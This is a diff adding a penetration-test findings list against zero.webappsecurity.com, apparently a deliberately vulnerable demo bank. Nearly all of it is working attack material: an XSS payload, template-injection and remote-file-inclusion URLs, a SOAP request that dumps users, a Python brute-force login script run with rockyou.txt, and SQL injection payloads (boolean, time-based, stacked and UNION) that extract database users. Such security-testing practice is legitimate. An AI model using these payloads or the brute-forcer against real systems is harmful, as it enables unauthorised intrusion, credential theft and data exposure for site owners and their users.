@@ -1,0 +1,194 @@
+I. Insufficient Access Control : Admin Page
+
+http://zero.webappsecurity.com/admin/index.html
+http://zero.webappsecurity.com/admin/users.html
+http://zero.webappsecurity.com/admin/currencies-add.html
+
+II. Sensitive Data Exposure : Log Files
+
+http://zero.webappsecurity.com/debug.txt
+http://zero.webappsecurity.com/errors/errors.log
+
+III. Insufficient Access Control: SOAP API (infoService)
+
+POST /web-services/infoService HTTP/1.1
+Host: zero.webappsecurity.com
+Connection: close
+Cookie: JSESSIONID=48DFD676
+Content-Type: text/xml; charset=utf-8
+Content-Length: 160
+SOAPAction: http://www.hp.com/webinspect/zerows/findAllUsers
+
+<Envelope xmlns="http://schemas.xmlsoap.org/soap/envelope/">
+  <Body>
+    <findAllUsers xmlns="http://www.hp.com/webinspect/zerows" />
+  </Body>
+</Envelope>
+
+IV. Reflected XSS (Cross-site Scripting)
+
+http://zero.webappsecurity.com/faq.html?question=2%3Cscript%3Ealert(1)%3C/script%3E
+
+<script type="text/javascript">
+    function getParameterByName(name) {
+        var regex = new RegExp("\\?.*?=(.*)$");
+
+        var results = regex.exec(window.location.search);
+
+        if (results == null) {
+            return "";
+        } else {
+            return decodeURIComponent(results[1]);
+        }
+    }
+
+    $(function () {
+        var question = getParameterByName("question");
+        $("#current_question").append(question);
+
+        $("html:not(:animated),body:not(:animated)").animate({ scrollTop: $("#question" + question).offset().top}, 100);
+    });
+</script>
+
+V. Stored XSS (Cross-site Scripting)
+
+http://zero.webappsecurity.com/admin/currencies.html
+
+http://zero.webappsecurity.com/admin/currencies-add.html (Country, Name)
+
+VI. Template Injection (Expression Language)
+
+http://zero.webappsecurity.com/search.html?searchTerm=${7*7}
+
+VI. Remote File Inclusion (RFI)
+
+http://zero.webappsecurity.com/help.html?topic=http://jebidiah.free.beeceptor.com
+
+VII. Weak Password Policy
+
+import requests as req
+
+wordlist = open("/usr/share/wordlists/rockyou.txt", "r")
+
+target = "http://zero.webappsecurity.com"
+while True:
+    ses = req.session()
+    res = ses.get(target + "/login.html")
+    
+    payload = {
+        "user_login": "username",
+        "user_password": wordlist.readline().strip(),
+        "submit": "Sign in",
+        "user_token": res.text.split('name="user_token" value="')[1][0:36]
+    }
+
+    res = ses.post(target + "/signin.html", data=payload, allow_redirects=False)
+    if res.headers["Location"] == "/login.html?login_error=true":
+        print("[-] PASSWORD ATTEMPT:\t{}".format(payload["user_password"]))
+    else:
+        print("[+] PASSWORD FOUND:\t{}".format(payload["user_password"]))
+        break
+
+wordlist.close()
+
+$ python3 bruteforce.py
+
+  [-] PASSWORD ATTEMPT:	123456
+  [-] PASSWORD ATTEMPT:	12345
+  [-] PASSWORD ATTEMPT:	123456789
+  [+] PASSWORD FOUND:	password
+
+VIII. Unencrypted Cookie:
+
+Cookie: JSESSIONID=95823440; username=username; password=password
+
+IX. Open redirect
+
+http://zero.webappsecurity.com/bank/redirect.html?url=http://jebidiah.free.beeceptor.com
+
+X. SQL Injection
+
+http://zero.webappsecurity.com/bank/pay-bills-conversion-rate-for-currency.html
+---
+POST /bank/pay-bills-conversion-rate-for-currency.html HTTP/1.1
+Host: zero.webappsecurity.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 30
+Origin: http://zero.webappsecurity.com
+Connection: close
+Referer: http://zero.webappsecurity.com/bank/pay-bills.html
+Cookie: JSESSIONID=6058B990; username=username; password=password
+Sec-GPC: 1
+
+currencyId=MXN' ORDER BY 1; --
+---
+---
+HTTP/1.1 200 OK
+Date: Sun, 25 Apr 2021 04:05:41 GMT
+Server: Apache-Coyote/1.1
+Access-Control-Allow-Origin: *
+Cache-Control: no-cache, max-age=0, must-revalidate, no-store
+Content-Type: application/json;charset=UTF-8
+Content-Language: en-US
+Content-Length: 23
+Connection: close
+
+{"data":[0.0837400000]}
+---
+
+http://zero.webappsecurity.com/bank/online-statements-for-account.html
+---
+POST /bank/online-statements-for-account.html HTTP/1.1
+Host: zero.webappsecurity.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 26
+Origin: http://zero.webappsecurity.com
+Connection: close
+Referer: http://zero.webappsecurity.com/bank/online-statements.html
+Cookie: JSESSIONID=6058B990; username=username; password=password
+Sec-GPC: 1
+
+accountId=1 ORDER BY 6; --
+---
+---
+Parameter: currencyId (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: currencyId=MXN' AND 6173=6173 AND 'ZCJv'='ZCJv
+
+    Type: stacked queries
+    Title: HSQLDB >= 1.7.2 stacked queries (heavy query - comment)
+    Payload: currencyId=MXN';CALL REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(7849),0),500000000),NULL)--
+
+    Type: time-based blind
+    Title: HSQLDB > 2.0 AND time-based blind (heavy query)
+    Payload: currencyId=MXN' AND CHAR(70)||CHAR(85)||CHAR(122)||CHAR(67)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),500000000),NULL) AND 'zbgY'='zbgY
+---
+---
+Parameter: accountId (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: accountId=1 AND 1378=1378
+
+    Type: stacked queries
+    Title: HSQLDB >= 1.7.2 stacked queries (heavy query - comment)
+    Payload: accountId=1;CALL REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4757),0),500000000),NULL)--
+
+    Type: time-based blind
+    Title: HSQLDB > 2.0 AND time-based blind (heavy query)
+    Payload: accountId=1 AND CHAR(80)||CHAR(117)||CHAR(89)||CHAR(65)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),500000000),NULL)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 6 columns
+    Payload: accountId=1 UNION ALL SELECT NULL,CHAR(113)||CHAR(107)||CHAR(118)||CHAR(122)||CHAR(113)||CHAR(113)||CHAR(122)||CHAR(85)||CHAR(102)||CHAR(68)||CHAR(75)||CHAR(74)||CHAR(71)||CHAR(70)||CHAR(67)||CHAR(105)||CHAR(87)||CHAR(76)||CHAR(86)||CHAR(102)||CHAR(98)||CHAR(70)||CHAR(118)||CHAR(98)||CHAR(69)||CHAR(103)||CHAR(113)||CHAR(107)||CHAR(108)||CHAR(102)||CHAR(121)||CHAR(103)||CHAR(66)||CHAR(68)||CHAR(90)||CHAR(75)||CHAR(122)||CHAR(110)||CHAR(71)||CHAR(114)||CHAR(68)||CHAR(80)||CHAR(100)||CHAR(100)||CHAR(83)||CHAR(113)||CHAR(113)||CHAR(120)||CHAR(122)||CHAR(113),NULL,NULL,NULL,NULL FROM INFORMATION_SCHEMA.SYSTEM_USERS-- MvAL
+---
